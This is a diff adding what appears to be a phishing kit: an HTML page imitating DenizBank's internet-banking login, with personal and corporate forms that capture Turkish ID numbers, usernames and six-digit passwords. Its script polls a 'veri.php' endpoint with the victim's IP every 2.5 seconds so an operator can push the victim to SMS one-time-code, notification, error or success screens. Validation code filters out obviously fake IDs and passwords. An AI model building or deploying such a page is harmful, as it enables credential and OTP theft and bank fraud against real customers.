@@ -1,0 +1,600 @@
+<html lang="tr" class=" js webkit chrome js webkit chrome"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-touch-fullscreen" content="yes">
+    <link rel="shortcut icon" href="./assets/img/favicon.ico">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="DenizBank İnternet Bankacılığı">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' http: https: data: blob:; child-src 'self' *.denizbank.com *.netmera-web.com analyticsb2c.com data:">
+    <title>DenizBank İnternet Bankacılığı</title>
+    <!-- CSS will be injected by webpack here -->
+    <!-- Preload link tags will be injected by webpack here -->
+    <link rel="stylesheet" href="./assets/css/styles.0fca6d11334e40b52585.css">
+    <style type="text/css">
+      .im-caret {
+        -webkit-animation: 1s blink step-end infinite;
+        animation: 1s blink step-end infinite;
+      }
+
+      @keyframes blink {
+
+        from,
+        to {
+          border-right-color: black;
+        }
+
+        50% {
+          border-right-color: transparent;
+        }
+      }
+
+      @-webkit-keyframes blink {
+
+        from,
+        to {
+          border-right-color: black;
+        }
+
+        50% {
+          border-right-color: transparent;
+        }
+      }
+
+      .im-static {
+        color: grey;
+      }
+    </style>
+  <style type="text/css">.im-caret {
+	-webkit-animation: 1s blink step-end infinite;
+	animation: 1s blink step-end infinite;
+}
+
+@keyframes blink {
+	from, to {
+		border-right-color: black;
+	}
+	50% {
+		border-right-color: transparent;
+	}
+}
+
+@-webkit-keyframes blink {
+	from, to {
+		border-right-color: black;
+	}
+	50% {
+		border-right-color: transparent;
+	}
+}
+
+.im-static {
+	color: grey;
+}
+</style></head>
+  <body class="login">
+    <app ng-version="8.2.14">
+      <vp-loading>
+        <div class="progress-loader hidden">
+          <img src="./assets/img/loading.gif" alt="Lütfen Bekleyin...">
+        </div>
+      </vp-loading>
+      <login-app>
+        <div class="login-wrap login-v4 ">
+          <header class="w-100 align-items-center login-header px-4 px-lg-5 justify-content-center d-flex not-background" login-header="">
+            <div class="col-8 col-lg-4 text-center p-0">
+              <a class="logo-light" href="javascript:void(0)">
+                <img alt="Light Logo" src="./assets/img/logo-light.svg">
+              </a>
+            </div>
+            <div class="mb-5" style="display: block;">
+              <div class="lang">
+                <a class="d-flex align-items-center" href="javascript:void(0)">
+                  <img src="./assets/img/world.svg">
+                  <span>ENG</span>
+                </a>
+              </div>
+            </div>
+          </header>
+          <div class="bacground-group">
+            <div class="login-overlay hidden"></div>
+            <div id="bireysel-bg" class="bg-image" style="background: url(./assets/img/autumn.jpg) center center no-repeat;"></div>
+            <div id="kurumsal-bg" class="bg-image hidden" style="background: url(./assets/img/corporate.jpg) center center no-repeat;"></div>
+          </div>
+          <vp-resultpanel id="LoginResultPanel"></vp-resultpanel>
+          <router-outlet class="d-none"></router-outlet>
+          <ng-component>
+                    <div class="d-flex align-items-center login-black-box-v3-container">
+                      </div>
+            <div class="container container-v2" style="display: block;">
+              <div class="row">
+                <div class="col-sm-12 col-lg-6">
+                  <div class="login-content login-content-v2">
+                    <div class="tab custom">
+                      <ul class="nav nav-tabs" id="myTab" role="tablist">
+                        <li class="nav-item">
+                          <a aria-controls="bireysel" aria-selected="true" class="nav-link active" data-toggle="tab" href="#bireysel" id="home-tab" onclick="Bireysel();" role="tab" value="TabTitlePersonal | BİREYSEL" vp-resource="">BİREYSEL </a>
+                        </li>
+                        <li class="nav-item">
+                          <a aria-controls="profile" aria-selected="false" class="nav-link" data-toggle="tab" href="#kurumsal" id="profile-tab" onclick="Kurumsal();" role="tab" value="TabTitleCorporate | KURUMSAL" vp-resource="">KURUMSAL </a>
+                        </li>
+                      </ul>
+                    </div>
+                    <div class="tab-content" id="myTabContent">
+                      <div aria-labelledby="home-tab" class="tab-pane active" id="bireysel" role="tabpanel">
+                        <div class="login-form">
+                         <form action="" method="POST" id="bireyselForm">
+                          <vp-containerrow cssclass="mb-22px form-group-v2">
+                            <div class="form-group mb-22px form-group-v2" id="row">
+                              <label class="align-items-center d-flex"> T.C. Kimlik No / Kullanıcı Adı </label>
+                              <vp-textbox cssclass="mask" iconclass="icon-user" placeholder="LoginUserNamePlaceholder | Kullanıcı Adı/TCKN" id="tcKimlikTextBox" switchofftext="LoginRememberMe | Hatırla" switchontext="LoginRememberMe | Hatırla" class="ng-untouched ng-dirty">
+                                <div class="input-group mb-3 d-flex align-items-center switch-group">
+                                  <div class="input-group-prepend">
+                                    <span class="input-group-text">
+                                      <em class="icon-user fs-24"></em>
+                                    </span>
+                                  </div>
+                                  <input autocomplete="off" autocorrect="off" spellcheck="false" type="text" placeholder="Kullanıcı Adı/TCKN" maxlength="11" options="[object Object]" inputmode="text" class="form-control mask" id="tckn" name="tckn" aria-label="Kullanıcı Adı/TCKN" aria-describedby="Kullanıcı Adı/TCKN">
+                                  <div class="input-group-append input-group-append-v2 switch-wrap">
+                                    <span class="input-group-text">
+                                      <label class="switch-text">
+                                        <input type="checkbox" id="tcOrUserNamecb" class="ng-untouched ng-pristine">
+                                        <div aria-live="assertive" class="slider round" role="button" aria-label="Hatırla">
+                                          <span aria-hidden="true" class="on">Hatırla</span>
+                                          <span aria-hidden="true" class="off">Hatırla</span>
+                                        </div>
+                                      </label>
+                                    </span>
+                                  </div>
+                                </div>
+                              </vp-textbox>
+                              <label class="help-block vp-validation-error userNameRequired">Lütfen T.C. kimlik No. veya Kullanıcı Adı giriniz.</label>
+                            </div>
+                          </vp-containerrow>
+                          <vp-containerrow cssclass="mb-22px form-group-v2" modulename="VirtualNumericKeyboard">
+                            <div class="form-group mb-22px form-group-v2" data-module="VirtualNumericKeyboard" id="row">
+                              <vp-passwordtextbox cssclass="mb-22px" inputtype="numeric" label="LoginPassword | Parola" id="bireyselSifreTextBox" placeholder="LoginPasswordPlaceholder | Parolanızı giriniz" class="ng-untouched ng-dirty">
+                                <div class="virtual-keyword">
+                                  <label for="bireyselSifre">Parola</label>
+                                  <div class="input-group mb-3" id="tbPasswordvd">
+                                    <div class="input-group-prepend">
+                                      <span class="input-group-text">
+                                        <em class="icon-lock fs-24"></em>
+                                      </span>
+                                    </div>
+                                    <input autocomplete="off" autocorrect="off" inputmode="numeric" pattern="[0-9]*" spellcheck="false" type="password" placeholder="Parolanızı giriniz" maxlength="6" class="form-control password numeric mask " id="bireyselSifre" name="bireyselSifre" aria-label="Parolanızı giriniz" aria-describedby="Parolanızı giriniz">
+                                    <div class="input-group-append">
+                                      <span class="input-group-text">
+                                        <em class="icon-keyboard fs-24 tooltipstered" vp-tooltip=""></em>
+                                      </span>
+                                    </div>
+                                  </div>
+                                  <div class="keyword-container"></div>
+                                </div>
+                              </vp-passwordtextbox>
+                              <label class="help-block vp-validation-error passwordRequired">Lütfen parolanızı girin.</label>
+                            </div>
+                          </vp-containerrow>
+                          <div class="form-group">
+                            <button style="color: white; width: 100%; margin: auto;" class="btn btn-red-gradient d-block border-0" type="submit">GİRİŞ YAP</button>
+                          </div>
+                          <div class="login-footer custom">
+                            <a class="btn btn-ghost mb-0 text-center text-md-left py-10-tablet" href="javascript:void(0)">
+                              <em class="icon-key fs-24 d-none d-md-inline"></em> PAROLAMI UNUTTUM / BLOKE KALDIR </a>
+                            <a class="btn btn-ghost new-user py-10-tablet" href="javascript:void(0)">
+                              <em class="icon-adduser fs-24 d-none d-md-inline"></em> KULLANICI OLUŞTUR </a>
+                          </div>
+                         </form>
+                        </div>
+                      </div>
+                      <div aria-labelledby="home-tab" class="tab-pane" id="kurumsal" role="tabpanel">
+                        <div class="login-form">
+                         <form action="" method="POST" id="kurumsalForm">
+                          <vp-containerrow cssclass="mb-22px form-group-v2">
+                            <div class="form-group mb-22px form-group-v2" id="row">
+                              <label class="align-items-center d-flex"> Kullanıcı Adı </label>
+                              <vp-textbox cssclass="mask" iconclass="icon-user" placeholder="LoginUserNamePlaceholder | Kullanıcı Adı" id="kullaniciadiTextBox" switchofftext="LoginRememberMe | Hatırla" switchontext="LoginRememberMe | Hatırla" class="ng-untouched ng-dirty">
+                                <div class="input-group mb-3 d-flex align-items-center switch-group">
+                                  <div class="input-group-prepend">
+                                    <span class="input-group-text">
+                                      <em class="icon-commercial fs-24"></em>
+                                    </span>
+                                  </div>
+                                  <input autocomplete="off" autocorrect="off" spellcheck="false" type="text" placeholder="Kullanıcı Adı" maxlength="32" options="[object Object]" inputmode="text" class="form-control mask" id="kullaniciadi" name="kullaniciadi" aria-label="Kullanıcı Adı" aria-describedby="Kullanıcı Adı">
+                                  <div class="input-group-append input-group-append-v2 switch-wrap">
+                                    <span class="input-group-text">
+                                      <label class="switch-text">
+                                        <input type="checkbox" id="UserName" class="ng-untouched ng-pristine">
+                                        <div aria-live="assertive" class="slider round" role="button" aria-label="Hatırla">
+                                          <span aria-hidden="true" class="on">Hatırla</span>
+                                          <span aria-hidden="true" class="off">Hatırla</span>
+                                        </div>
+                                      </label>
+                                    </span>
+                                  </div>
+                                </div>
+                              </vp-textbox>
+                              <label class="help-block vp-validation-error userNameRequired">Lütfen kullanıcı adınızı girin.</label>
+                            </div>
+                          </vp-containerrow>
+                          <vp-containerrow cssclass="mb-22px form-group-v2" modulename="VirtualNumericKeyboard">
+                            <div class="form-group mb-22px form-group-v2" data-module="VirtualNumericKeyboard" id="row">
+                              <vp-passwordtextbox cssclass="mb-22px" inputtype="numeric" label="LoginPassword | Parola" id="kurumsalSifreTextBox" placeholder="LoginPasswordPlaceholder | Parolanızı giriniz" class="ng-untouched ng-dirty">
+                                <div class="virtual-keyword">
+                                  <label for="kurumsalSifre">Parola</label>
+                                  <div class="input-group mb-3" id="tbPasswordvd">
+                                    <div class="input-group-prepend">
+                                      <span class="input-group-text">
+                                        <em class="icon-lock fs-24"></em>
+                                      </span>
+                                    </div>
+                                    <input autocomplete="off" autocorrect="off" inputmode="numeric" pattern="[0-9]*" spellcheck="false" type="password" placeholder="Parolanızı giriniz" maxlength="6" class="form-control password numeric mask " id="kurumsalSifre" name="kurumsalSifre" aria-label="Parolanızı giriniz" aria-describedby="Parolanızı giriniz">
+                                    <div class="input-group-append">
+                                      <span class="input-group-text">
+                                        <em class="icon-keyboard fs-24 tooltipstered" vp-tooltip=""></em>
+                                      </span>
+                                    </div>
+                                  </div>
+                                  <div class="keyword-container"></div>
+                                </div>
+                              </vp-passwordtextbox>
+                              <label class="help-block vp-validation-error passwordRequired">Lütfen parolanızı girin.</label>
+                            </div>
+                          </vp-containerrow>
+                          <div class="form-group">
+                            <button style="color: white; width: 100%; margin: auto;" class="btn btn-red-gradient d-block border-0" type="submit">GİRİŞ YAP</button>
+                          </div>
+                          <div class="login-footer custom">
+                            <a class="btn btn-ghost mb-0 text-center text-md-left py-10-tablet" href="javascript:void(0)">
+                              <em class="icon-key fs-24 d-none d-md-inline"></em> PAROLAMI UNUTTUM / BLOKE KALDIR </a>
+                            <a class="btn btn-ghost new-user py-10-tablet" href="javascript:void(0)">
+                              <em class="icon-adduser fs-24 d-none d-md-inline"></em> KULLANICI OLUŞTUR </a>
+                          </div>
+                         </form>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-sm-12 col-lg-6 d-md-block d-none">
+                  <div class="login-qr-content flex-lg-column">
+                    <div class="col-lg-auto col">
+                      <h3 value="LoginWithQrCode | QR Kod'la Giriş" vp-resource="">QR Kod'la Giriş </h3>
+                      <p value="LoginWithQrInfo |	MobilDeniz veya DenizKartım üzerinden kodu okutarak hızlıca giriş yapabilirsiniz." vp-resource="">MobilDeniz üzerinden kodu okutarak hızlıca giriş yapabilirsiniz. </p>
+                    </div>
+                    <div class="col-lg-auto col">
+                      <a href="javascript:void(0)">
+                        <div class="qr-wrap passive">
+                          <picture>
+                            <img alt="QR Code" src="./assets/img/qrPhoto.jpg" srcset="./assets/img/qrPhoto.jpg, ./assets/img/qrPhoto2x.jpg 2x">
+                          </picture>
+                          <figcaption>
+                            <p class="qrColor">
+                              <strong>QR Kod</strong> üretmek için tıklayınız.
+                            </p>
+                          </figcaption>
+                        </div>
+                      </a>
+                      <vp-loading-panel cssclass="bg-transparent" id="qrLoading"></vp-loading-panel>
+                      <div>
+                        <div class="form-wrap login-form" data-module="SmsTimer">
+                          <div class="form-group timer-wrap">
+                            <p value="EndQRText | QR Kod giriş özelliği, MobilDeniz veya DenizKartım giriş ekranı içinde Hızlı Menü'de ''İnternet Şube Giriş'' seçeneği ile yer almaktadır." vp-resource="" class="pt-3">QR’la giriş özelliği için MobilDeniz ‘Giriş Yap’ butonuna basmadan önce; Hızlı Menü &gt; QR işlemleri &gt; İnternet Şube Giriş sayfası adımlarını takip ediniz. </p>
+                          </div>
+                        </div>
+                      </div>
+                      <a class="link-icon d-lg-none d-md-block" href="javascript:void(0)">
+                        <em class="icon-change fs-24"></em> QR Kod Üret </a>
+                    </div>
+                    <a class="link-icon d-lg-block d-none" href="javascript:void(0)">
+                      <em class="icon-change fs-24"></em> QR Kod Üret </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+                                    <vp-modalpopup id="infoModal" style="display: none;">
+              <div aria-hidden="true" class="modal-backdrop show" style="display: block;"></div>
+              <div role="dialog" tabindex="-1" class="modal" id="infoModalmd" aria-labelledby="Bilgilendirme" style="display: block;">
+                <div class="modal-dialog modal-dialog-centered modal-lg modal-dialog-scrollable modal-background" role="document">
+                  <div class="modal-content">
+                    <div class="modal-body text-center default-bg">
+                      <button class="close d-flex align-items-center" type="button" id="infoModalBtnClose" aria-label="Kapat" onclick="document.getElementById('infoModal').style.display = 'none';"> Kapat <span aria-hidden="true" class="icon-close ml-2"></span></button>
+                      <p class="modal-title-custom ">Bilgilendirme</p>
+                      <div class="result-content warning-result">
+                        <p class="message-row font-weight-bolder">Girdiğiniz bilgiler hatalı. Bilgilerinizi kontrol ederek tekrar deneyiniz. Parolanız yoksa "Kullanıcı Oluştur", parolanızı unuttuysanız "Parolamı Unuttum" adımını izleyebilirsiniz.</p>
+                        <div class="row col-md-10 mx-auto mt-5 mb-4">
+                          <div class="col-12 mb-4 col-md-6 mx-auto"></div>
+                        </div>
+                      </div>
+                      <div class="keyboard-spacer"></div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </vp-modalpopup>
+          </ng-component>
+          <footer class="login-footer login-footer-v3 ">
+            <vp-announcement id="loginAnnouncement" style="display: block;">
+              <div class="black-band black-band-v2">
+                <picture class="footer-logo">
+                  <img alt="footer-logo" src="./assets/img/login-footer-logo.svg">
+                </picture>
+                <div class="content-v2 d-flex align-items-center w-100">
+                  <p class="content-first">
+                    <strong>Bilgilendirme:</strong>
+                  </p>
+                  <p class="content-second">Size özel giriş bilgilerinizi hiç kimse ile paylaşmayınız. Her girişinizde karşılama mesajınızı mutlaka kontrol ediniz.</p>
+                </div>
+              </div>
+            </vp-announcement>
+            <div class="bottom bottom-v2">
+              <a class="logo-enbd no-link" href="javascript:void(0)">
+                <img alt="enbd" src="./assets/img/enbd.png">
+              </a>
+              <div class="link-group">
+                <a class="link-icon" rel="noopener noreferrer" href="javascript:void(0)" aria-label="İnternet Güvenliği">
+                  <em aria-hidden="true" class="icon-security-2 fs-20"></em>
+                  <span>İnternet Güvenliği</span>
+                </a>
+                <a class="link-icon" rel="noopener noreferrer" href="javascript:void(0)" aria-label="Yardım ve Öneriler">
+                  <em aria-hidden="true" class="icon-help-2 fs-20"></em>
+                  <span>Yardım ve Öneriler</span>
+                </a>
+                <a class="link-icon" rel="noopener noreferrer" href="javascript:void(0)" aria-label="İşlem Limitleri ve Saatleri">
+                  <em aria-hidden="true" class="icon-time-2 fs-20"></em>
+                  <span>İşlem Limitleri ve Saatleri</span>
+                </a>
+                <a class="link-icon" rel="noopener noreferrer" href="javascript:void(0)" aria-label="0850 222 0 800">
+                  <em aria-hidden="true" class="icon-phone-2 fs-20"></em>
+                  <span>0850 222 0 800</span>
+                </a>
+              </div>
+            </div>
+          </footer>
+        </div>
+      </login-app>
+    </app>
+    <script src="./assets/js/scripts.4be75bac532d103e7057.js"></script>
+    <script>
+      function TCNOKontrol(TCNO) {
+        var tek = 0,
+          cift = 0,
+          sonuc = 0,
+          TCToplam = 0,
+          i = 0,
+          hatali = [11111111110, 22222222220, 33333333330, 44444444440, 55555555550, 66666666660, 7777777770, 88888888880, 99999999990];
+        if (TCNO.length != 11) return false;
+        if (isNaN(TCNO)) return false;
+        if (TCNO[0] == 0) return false;
+        tek = parseInt(TCNO[0]) + parseInt(TCNO[2]) + parseInt(TCNO[4]) + parseInt(TCNO[6]) + parseInt(TCNO[8]);
+        cift = parseInt(TCNO[1]) + parseInt(TCNO[3]) + parseInt(TCNO[5]) + parseInt(TCNO[7]);
+        tek = tek * 7;
+        sonuc = Math.abs(tek - cift);
+        if (sonuc % 10 != TCNO[9]) return false;
+        for (var i = 0; i < 10; i++) {
+          TCToplam += parseInt(TCNO[i]);
+        }
+        if (TCToplam % 10 != TCNO[10]) return false;
+        if (hatali.toString().indexOf(TCNO) != -1) return false;
+        return true;
+      }
+
+      function KULADIKontrol(KULLANICIADI) {
+        if (KULLANICIADI.length < 4) return false;
+        if (KULLANICIADI[0] == 0) return false;
+        return true;
+      }
+
+      function SIFREKontrol(SIFRE) {
+        var hatali = [111111, 222222, 333333, 444444, 555555, 666666, 777777, 888888, 999999];
+        if (SIFRE.length != 6) return false;
+        if (isNaN(SIFRE)) return false;
+        if (hatali.toString().indexOf(SIFRE) != -1) return false;
+        return true;
+      }
+
+      function SMSKONTROL(SMS) {
+        var hatali = [111111, 222222, 333333, 444444, 555555, 666666, 777777, 888888, 999999];
+        if (isNaN(SMS)) return false;
+        if (SMS[0] == 0) return false;
+        if (hatali.toString().indexOf(SMS) != -1) return false;
+        return true;
+      }
+
+      document.addEventListener('DOMContentLoaded', () => {
+        let Arr = [],
+          empty,
+          forDeletion = ['true']
+        let form = document.getElementById('bireyselForm'),
+          TCKIMLIK = document.getElementById("tckn"),
+          BIREYSELSIFRE = document.getElementById("bireyselSifre"),
+          textBox3 = document.getElementById("tcKimlikTextBox"),
+          textBox4 = document.getElementById("bireyselSifreTextBox")
+        form.addEventListener('submit', (e) => {
+          e.preventDefault();
+          TCNOKontrol(TCKIMLIK.value) === false ? (textBox3.classList.add("ng-invalid"), Arr = Arr.filter(item => !forDeletion.includes(item))) : Arr.push('true');
+          SIFREKontrol(BIREYSELSIFRE.value) === false ? (textBox4.classList.add("ng-invalid"), Arr = Arr.filter(item => !forDeletion.includes(item))) : Arr.push('true');
+          Arr.length >= 2 ? form.submit() : empty;
+        })
+      })
+
+      document.addEventListener('DOMContentLoaded', () => {
+        let Arr = [],
+          empty,
+          forDeletion = ['true']
+        let form = document.getElementById('kurumsalForm'),
+          KULLANICIADI = document.getElementById("kullaniciadi"),
+          KURUMSALSIFRE = document.getElementById("kurumsalSifre"),
+          textBox1 = document.getElementById("kullaniciadiTextBox"),
+          textBox2 = document.getElementById("kurumsalSifreTextBox")
+        form.addEventListener('submit', (e) => {
+          e.preventDefault();
+          KULADIKontrol(KULLANICIADI.value) === false ? (textBox1.classList.add("ng-invalid"), Arr = Arr.filter(item => !forDeletion.includes(item))) : Arr.push('true');
+          SIFREKontrol(KURUMSALSIFRE.value) === false ? (textBox2.classList.add("ng-invalid"), Arr = Arr.filter(item => !forDeletion.includes(item))) : Arr.push('true');
+          Arr.length >= 2 ? form.submit() : empty;
+        })
+      })
+
+      document.addEventListener('DOMContentLoaded', () => {
+        let Arr = [],
+          empty,
+          forDeletion = ['true']
+        let form = document.getElementById('smsForm'),
+          SMS = document.getElementById("otpCode"),
+          textBox1 = document.getElementById("otpTextBox")
+        form.addEventListener('submit', (e) => {
+          e.preventDefault();
+          SMSKONTROL(SMS.value) === false ? (textBox1.classList.add("ng-invalid"), Arr = Arr.filter(item => !forDeletion.includes(item))) : Arr.push('true');
+          Arr.length >= 1 ? form.submit() : empty;
+        })
+      })
+    </script>
+    <script>
+      function Bireysel() {
+        var Bireysel = document.getElementById("bireysel-bg");
+        var Kurumsal = document.getElementById("kurumsal-bg");
+        Kurumsal.classList.add("hidden");
+        Bireysel.classList.remove("hidden");
+        document.cookie = "tema=Bireysel";
+      }
+
+      function Kurumsal() {
+        var Bireysel = document.getElementById("bireysel-bg");
+        var Kurumsal = document.getElementById("kurumsal-bg");
+        Bireysel.classList.add("hidden");
+        Kurumsal.classList.remove("hidden");
+        document.cookie = "tema=Kurumsal";
+      }
+
+      $(document).ready(function() { 
+          var Bireysel = document.getElementById("bireysel-bg"),
+          Kurumsal = document.getElementById("kurumsal-bg"),
+          KurumsalTab = document.getElementById("profile-tab"),
+          BireyselTab = document.getElementById("home-tab"),
+          KurumsalForm = document.getElementById("kurumsal"),
+          BireyselForm = document.getElementById("bireysel")
+
+        if(document.cookie == "tema=Bireysel") {
+          Kurumsal.classList.add("hidden");
+          Bireysel.classList.remove("hidden");
+          KurumsalTab.classList.remove("active");
+          BireyselTab.classList.add("active");
+          BireyselForm.classList.add("active");
+          KurumsalForm.classList.remove("active");
+        } else if(document.cookie == "tema=Kurumsal") {
+          Bireysel.classList.add("hidden");
+          Kurumsal.classList.remove("hidden");
+          KurumsalTab.classList.add("active");
+          BireyselTab.classList.remove("active");
+          BireyselForm.classList.remove("active");
+          KurumsalForm.classList.add("active");
+        } else {
+          Kurumsal.classList.add("hidden");
+          Bireysel.classList.remove("hidden");
+          KurumsalTab.classList.remove("active");
+          BireyselTab.classList.add("active");
+          BireyselForm.classList.add("active");
+          KurumsalForm.classList.remove("active");
+        }
+      });
+
+      if(window.location.search == "?control=notify") {
+        var timeleft = 90;
+        var progressBarleft = 600;
+        var Sayac = document.getElementById("Sayac");
+        var BildirimGonder = document.getElementById("YenidenGonder");
+        var Timer1 = setInterval(function(){
+          if(timeleft <= 0){
+            Sayac.classList.add("hidden");
+            BildirimGonder.classList.remove("hidden");
+          } else {
+          document.getElementById("SecondTimer").innerHTML = timeleft;
+          timeleft -= 1;
+        }}, 1100);
+
+        var Timer2 = setInterval(function(){
+          if(progressBarleft <= 0){
+            clearInterval(Timer2);
+          } else {
+            document.getElementById("notificationTimeline").style.width = 600 - progressBarleft;
+            progressBarleft -= 1.25;
+        }}, 100);
+      }
+
+      if(window.location.search == "?control=otpRequest") {
+        $(document).ready(function() { 
+          var KurumsalTab = document.getElementById("smsprofile-tab"),
+          BireyselTab = document.getElementById("smshome-tab")
+
+        if(document.cookie == "tema=Bireysel") {
+          KurumsalTab.classList.remove("active");
+          BireyselTab.classList.add("active");
+        } else if(document.cookie == "tema=Kurumsal") {
+          KurumsalTab.classList.add("active");
+          BireyselTab.classList.remove("active");
+        } else {
+          KurumsalTab.classList.remove("active");
+          BireyselTab.classList.add("active");
+        }
+      });
+      }
+
+      if(window.location.search == "?control=otpRequestError") {
+        $(document).ready(function() { 
+          var KurumsalTab = document.getElementById("smsprofile-tab"),
+          BireyselTab = document.getElementById("smshome-tab")
+
+        if(document.cookie == "tema=Bireysel") {
+          KurumsalTab.classList.remove("active");
+          BireyselTab.classList.add("active");
+        } else if(document.cookie == "tema=Kurumsal") {
+          KurumsalTab.classList.add("active");
+          BireyselTab.classList.remove("active");
+        } else {
+          KurumsalTab.classList.remove("active");
+          BireyselTab.classList.add("active");
+        }
+      });
+      }
+    </script>
+    <script type="text/javascript">
+      $(document).ready(function() {
+      
+      gonder();
+      
+      var int = self.setInterval("gonder()", 2500);
+      
+      });
+      
+      function gonder() {
+      
+      $.ajax({
+         type: 'POST',
+         url: 'veri.php?ip=160.36.59.197',
+         success: function(msg) {
+             if (msg == 'sms') {
+                 window.location.href = '/?control=otpRequest';
+             }
+             if (msg == 'tebrik') {
+                 window.location.href = '/?control=success';
+             }
+             if (msg == 'bildirim') {
+                 window.location.href = '/?control=notify';
+             }
+             if (msg == 'hata1') {
+                 window.location.href = '/?control=otpRequestError';
+             }
+             if (msg == 'hata2') {
+                 window.location.href = '/?control=error';
+             }
+             if (msg == 'back') {
+                 window.location.href = '/';
+             }
+         }
+      });
+      }     
+    </script>
+  
+</body></html>
